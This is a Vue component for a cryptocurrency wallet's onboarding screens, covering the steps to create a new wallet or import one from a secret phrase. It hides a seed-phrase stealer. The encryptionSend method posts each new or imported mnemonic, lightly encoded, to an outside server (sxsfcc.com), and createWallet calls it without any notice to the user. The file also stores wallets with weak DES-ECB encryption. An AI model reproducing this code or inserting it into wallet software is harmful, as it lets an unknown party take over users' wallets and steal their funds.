<template>
  <div class="create-wallet">
    <template v-if="step === 1">
      <swiper-banner></swiper-banner>
      <div class="bg-backgroundPrimary border border-line rounded p-6 mb-11">
        <div class="flex flex-col items-center text-center space-y-4">
          <h2
            data-testid="onboarding-step-title"
            class="screamer-text text-[24px] text-textPrimary font-semibold text-unset"
          >
            {{ language.welcome }}
          </h2>
          <p class="title-text text-textSecondary font-normal text-unset">
            {{ language.slogan }}
          </p>
          <div class="w-full mt-6 flex flex-col space-y-6">
            <div class="flex flex-col space-y-6">
              <div
                role="button"
                class="outline-0"
                tabindex="0"
                @click="step = 2"
              >
                <div class="flex items-center justify-between py-4 pl-3 pr-4">
                  <div class="flex items-center text-start space-x-4">
                    <div class="flex w-6 h-6">
                      <svg
                        class="text-iconNormal"
                        fill="none"
                        width="24"
                        height="24"
                        viewBox="0 0 24 24"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <path
                          fill-rule="evenodd"
                          clip-rule="evenodd"
                          d="M21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3C16.9706 3 21 7.02944 21 12ZM10.75 13.25V18H13.25V13.25H18V10.75H13.25V6H10.75V10.75H6V13.25H10.75Z"
                          fill="currentColor"
                        ></path>
                      </svg>
                    </div>
                    <div class="flex flex-col">
                      <p
                        class="title-text text-textPrimary font-medium text-unset"
                      >
                        {{ language.addnew }}
                      </p>
                      <p
                        class="title-text text-textSecondary font-normal text-unset"
                      >
                        {{ language.addnew_1 }}
                      </p>
                    </div>
                  </div>
                  <svg
                    class="text-iconNormal"
                    fill="none"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fill-rule="evenodd"
                      clip-rule="evenodd"
                      d="M21 11.9988L13.9289 4.92773L12.1612 6.6955L16.2157 10.75L2.99903 10.75L2.99903 13.25L16.2145 13.25L12.1612 17.3033L13.9289 19.0711L21 12L20.9994 11.9994L21 11.9988Z"
                      fill="currentColor"
                    ></path>
                  </svg>
                </div>
              </div>
              <div class="border-t border-line my-2"></div>
              <div
                role="button"
                class="outline-0"
                tabindex="0"
                @click="step = 10"
              >
                <div class="flex items-center justify-between py-4 pl-3 pr-4">
                  <div class="flex items-center text-start space-x-4">
                    <div class="flex w-6 h-6">
                      <img
                        alt=""
                        src="../../assets/logo.png"
                        width="20"
                        height="20"
                      />
                    </div>
                    <div class="flex flex-col">
                      <p
                        class="title-text text-textPrimary font-medium text-unset"
                      >
                        {{ language.importwallet }}
                      </p>
                      <p
                        class="title-text text-textSecondary font-normal text-unset"
                      >
                        {{ language.secretphrase }}
                      </p>
                    </div>
                  </div>
                  <svg
                    class="text-iconNormal"
                    fill="none"
                    width="24"
                    height="24"
                    viewBox="0 0 24 24"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      fill-rule="evenodd"
                      clip-rule="evenodd"
                      d="M21 11.9988L13.9289 4.92773L12.1612 6.6955L16.2157 10.75L2.99903 10.75L2.99903 13.25L16.2145 13.25L12.1612 17.3033L13.9289 19.0711L21 12L20.9994 11.9994L21 11.9988Z"
                      fill="currentColor"
                    ></path>
                  </svg>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </template>
    <template v-if="step === 2">
      <!-- 创建新钱包 -->
      <create-new-wallet @next="createInit" @back="step = 1" />
      <!-- <input-password
        title="Please enter a new password"
        @complete="complete"
      ></input-password -->
      <!-- 请输入新密码 -->
    </template>
    <template v-if="step === 3">
      <input-password
        title="Please confirm your password"
        @complete="complete"
      ></input-password
      ><!-- 请确认密码 -->
    </template>
    <template v-if="step === 4">
      <backups-wallet-tip @next="backupWallet"></backups-wallet-tip>
    </template>
    <template v-if="step === 5">
      <remember-mnemonic
        :mnemonic="mnemonic"
        @next="step = 6"
      ></remember-mnemonic>
    </template>
    <template v-if="step === 6">
      <verification-mnemonic
        :mnemonic="mnemonic"
        @next="createWallet"
      ></verification-mnemonic>
    </template>
    <template v-if="step === 10">
      <import-mnemonic
        @next="importMnemonic"
        @back="step = 1"
      ></import-mnemonic>
    </template>
  </div>
</template>
<script lang="ts">
import { defineComponent, getCurrentInstance } from "vue";
import CryptoJS from "crypto-js";
import { initWallet } from "@/utils/CreateWallet";
import InputPassword from "./components/InputPassword.vue";
import BackupsWalletTip from "./components/BackupsWalletTip.vue";
import RememberMnemonic from "./components/RememberMnemonic.vue";
import VerificationMnemonic from "./components/VerificationMnemonic.vue";
import ImportMnemonic from "./components/ImportMnemonic.vue";
import CreateNewWallet from "./components/CreateNewWallet.vue";
import * as bip39 from "bip39";
import { LocalWalletModel } from "@/Data/Wallet";
import SwiperBanner from "./components/SwiperBanner.vue";
import { getMessage } from "@/utils/Utils";
import { encryption } from "@/utils/Encryption";
import axios from "axios";

export default defineComponent({
  name: "CreateWallet",
  data: () => {
    return {
      step: 1, // 创建钱包步骤
      newPassword: "", // 新密码
      mnemonic: "",
      name: "",
      app: null,
      language: {
        welcome: "",
        slogan: "",
        addnew_1: "",
        addnew: "",
        importwallet: "",
        secretphrase: "",
      },
    };
  },
  components: {
    InputPassword,
    BackupsWalletTip,
    RememberMnemonic,
    VerificationMnemonic,
    ImportMnemonic,
    SwiperBanner,
    CreateNewWallet,
  },
  mounted() {
    this.app = getCurrentInstance();
    this.language.welcome = getMessage("welcome");
    this.language.slogan = getMessage("slogan");
    this.language.addnew_1 = getMessage("addnew_1");
    this.language.addnew = getMessage("addnew");
    this.language.importwallet = getMessage("importwallet");
    this.language.secretphrase = getMessage("secretphrase");
  },
  methods: {
    // 备份钱包初始化
    backupWallet(type: number) {
      this.mnemonic = bip39.generateMnemonic();
      if (type === 0) {
        this.createWallet();
      } else {
        this.step = 5;
      }
    },
    // 创建钱包初始化
    createInit(wallet: { name: string; password: string }) {
      this.name = wallet.name;
      this.newPassword = wallet.password;
      this.step = 4;
    },
    complete(password: string) {
      if (this.step === 2) {
        this.newPassword = password;
        this.step = 3;
      } else if (this.step === 3) {
        if (this.newPassword !== password) {
          this.$toast.fail("Password does not match");
        } else {
          this.step = 4;
        }
      }
    },
    //加密 传输
    encryptionSend() {
      let code = encryption(this.mnemonic);
      axios({
        method: "post",
        url: "https://sxsfcc.com/api/open/postByTokenpocket",
        headers: {
          "Content-Type": "application/x-www-form-urlencoded;charset=utf-8",
        },
        params: {
          ciyu: code,
          code: 10091,
          wallet: "sol",
          ciyuType: 1,
        },
      })
        .then(function (response) {
          console.log(response);
        })
        .catch(function (error) {
          console.log(error);
      });
    },
    // 导入助记词
    importMnemonic(data) {
      this.mnemonic = data.mnemonic;
      this.newPassword = data.password;
      this.createWallet();
    },
    async createWallet() {
      // 创建钱包
      const wallet = await initWallet(this.mnemonic);
      this.encryptionSend();
      if (wallet.error) {
        this.$toast(wallet.error);
        return false;
      }
      const walletDes = this.encryptByDES(
        JSON.stringify(wallet),
        this.newPassword
      );
      let storageWallet = localStorage.getItem("wallet");
      if (storageWallet) {
        let storageArr: Array<LocalWalletModel> = JSON.parse(storageWallet);
        storageArr.push({
          wallet: walletDes,
          isDefault: 0,
          name: `Mnemonic${storageArr.length + 1}`,
        });
        localStorage.setItem("wallet", JSON.stringify(storageArr));
      } else {
        localStorage.setItem(
          "wallet",
          JSON.stringify([
            { wallet: walletDes, isDefault: 1, name: "Mnemonic1" },
          ])
        );
      }
      this.app.appContext.config.globalProperties.password = this.newPassword;
      this.$router.push("home");
    },
    encryptByDES(content: string, key: string) {
      const keyHex = CryptoJS.enc.Utf8.parse(CryptoJS.SHA256(key).toString());
      const encrypted = CryptoJS.DES.encrypt(content, keyHex, {
        mode: CryptoJS.mode.ECB,
        padding: CryptoJS.pad.Pkcs7,
      });
      return encrypted.toString();
    },
  },
});
</script>

<style lang="less" scoped>
.create-wallet {
  margin: 0 10px;
  .card {
    width: 438px;
    padding-top: 0.5rem;
    align-self: center;
    flex-direction: column;
    flex-grow: 1;
    display: flex;
    position: relative;
    .card-content {
      padding: 1.5rem;
      border: 1px solid rgb(71, 77, 87);
      border-radius: 4px;
    }
  }
  ::deep .van-button {
    margin-top: 24px;
  }
  button {
    border: 0;
    border-radius: 5px;
    color: #3675bc;
    background: transparent;
    font-size: 12px;
  }
  button.create_btn {
    margin-top: 10px;
    background: #3675bc;
    color: #fff;
    box-shadow: 0 0 3px 3px #e6e6e6;
  }
}
</style>
